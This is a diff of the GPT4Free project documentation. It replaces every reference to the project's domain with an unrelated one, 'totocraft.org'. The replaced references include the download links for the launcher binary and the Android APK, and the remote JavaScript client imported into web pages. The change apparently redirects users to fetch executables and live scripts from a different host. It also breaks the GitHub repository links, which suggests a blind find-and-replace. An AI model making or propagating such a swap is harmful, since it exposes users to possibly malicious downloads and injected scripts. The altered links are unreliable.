@@ -1,8 +1,8 @@
-## g4f.dev Documentation
+## totocraft.org Documentation
 
 <img width="1536" height="1024" alt="1000066426" src="https://github.com/user-attachments/assets/55c52184-1998-403b-aae1-afe02fb2e3e8" />
 
-Welcome to the official **g4f.dev** docs for **GPT4Free** – free and convenient AI endpoints you can use directly in your apps, scripts, and even right in your browser.
+Welcome to the official **totocraft.org** docs for **GPT4Free** – free and convenient AI endpoints you can use directly in your apps, scripts, and even right in your browser.
 Here you’ll find a clear overview, quick examples, and entry points to deeper docs for every major feature.
 
 ---
@@ -11,15 +11,15 @@ Here you’ll find a clear overview, quick examples, and entry points to deeper 
 
 For full install guides—choose your method:
 
-- [Downloads: g4f-go and Android APK](https://g4f.dev/#downloads)
+- [Downloads: g4f-go and Android APK](https://totocraft.org/#downloads)
 - [Git Install](git.md)
 - [Docker](docker.md)
 - [Requirements](requirements.md)
 
 ### Downloads
 
-- **Desktop (Windows, macOS, Linux):** Download the [g4f-go launcher](https://g4f.dev/#downloads). It is a small self-contained binary that installs CPython and g4f on first run, so no system Python is required.
-- **Android:** Download the [G4F Android APK](https://g4f.dev/#downloads) for the native app, or use the g4f-go Termux build on ARM64 devices.
+- **Desktop (Windows, macOS, Linux):** Download the [g4f-go launcher](https://totocraft.org/#downloads). It is a small self-contained binary that installs CPython and g4f on first run, so no system Python is required.
+- **Android:** Download the [G4F Android APK](https://totocraft.org/#downloads) for the native app, or use the g4f-go Termux build on ARM64 devices.
 - **All builds:** Browse every published asset on the [GitHub releases page](https://github.com/xtekky/gpt4free/releases).
 
 The homepage detects your operating system and links to the matching build automatically.
@@ -81,7 +81,7 @@ Use the **official JS client** right in the browser—no backend needed.
 For text generation:
 ```html
 <script type="module">
-    import Client from 'https://g4f.dev/dist/js/client.js';
+    import Client from 'https://totocraft.org/dist/js/client.js';
 
     const client = new Client();
     const result = await client.chat.completions.create({
@@ -95,7 +95,7 @@ For text generation:
 And for image generation:
 ```html
 <script type="module">
-    import Client from 'https://g4f.dev/dist/js/client.js';
+    import Client from 'https://totocraft.org/dist/js/client.js';
 
     const client = new Client();
     const response = await client.images.generate({
@@ -136,7 +136,7 @@ Examples
 ## Deep Dives
 
 - [API endpoints and usage](ready_to_use.md) ***new**
-- [Available Providers & Models](https://g4f.dev/docs/providers-and-models.html)
+- [Available Providers & Models](https://totocraft.org/docs/providers-and-models.html)
 - [Selecting a Provider](selecting_a_provider.md)
 - [Provider Documentation](providers/)
 - [API docs (full spec)](/api-docs)
@@ -149,16 +149,16 @@ Examples
 - [Routing with custom models (OpenClaw)](guides/openclaw.md)
 - [Integrations: LangChain, PydanticAI](pydantic_ai.md)
 - [GUI/WebUI](gui.md), [Phone](guides/phone.md), [Backend API](backend_api_documentation.md)
-- [Troubleshooting](https://github.com/gpt4free/g4f.dev/issues)
+- [Troubleshooting](https://github.com/gpt4free/totocraft.org/issues)
 
 ---
 
 ## Community & Links
 
-- **Open Source:** [GitHub: gpt4free/g4f.dev](https://github.com/gpt4free/g4f.dev)
+- **Open Source:** [GitHub: gpt4free/totocraft.org](https://github.com/gpt4free/totocraft.org)
 - **Contribute & Report Bugs:** PRs & issues are welcome!
-- **Project Website:** [https://g4f.dev/](https://g4f.dev/)
-- **Legal:** The homepage and documentation may display ads served by Google AdSense. Conversations are stored locally on your device by default, with optional end-to-end encrypted cloud sync available for members. Usage logs and parts of prompts may be stored for up to 14 days to detect abuse and multiple accounts; account data of optional member accounts is kept for at least 90 days. See the [Privacy Policy](https://g4f.dev/privacy.html) and [Terms of Service](https://g4f.dev/terms.html).
+- **Project Website:** [https://totocraft.org/](https://totocraft.org/)
+- **Legal:** The homepage and documentation may display ads served by Google AdSense. Conversations are stored locally on your device by default, with optional end-to-end encrypted cloud sync available for members. Usage logs and parts of prompts may be stored for up to 14 days to detect abuse and multiple accounts; account data of optional member accounts is kept for at least 90 days. See the [Privacy Policy](https://totocraft.org/privacy.html) and [Terms of Service](https://totocraft.org/terms.html).
 - **Pollinations AI:**  
   <img src="https://image.pollinations.ai/prompt/Create+a+logo+for+Pollinations+AI+featuring+an+abstract+flower+blooming+digital+petals+glowing+center+futuristic+font+Pollinations+AI?width=512&height=256&nologo=true" height="80">
 
@@ -166,6 +166,6 @@ Examples
 
 ---
 
-GPT4Free and g4f.dev are continuously improving. Have fun building, and let the bots do the heavy lifting for you!
+GPT4Free and totocraft.org are continuously improving. Have fun building, and let the bots do the heavy lifting for you!
 
-[← Back to g4f.dev](https://g4f.dev/)
+[← Back to totocraft.org](https://totocraft.org/)
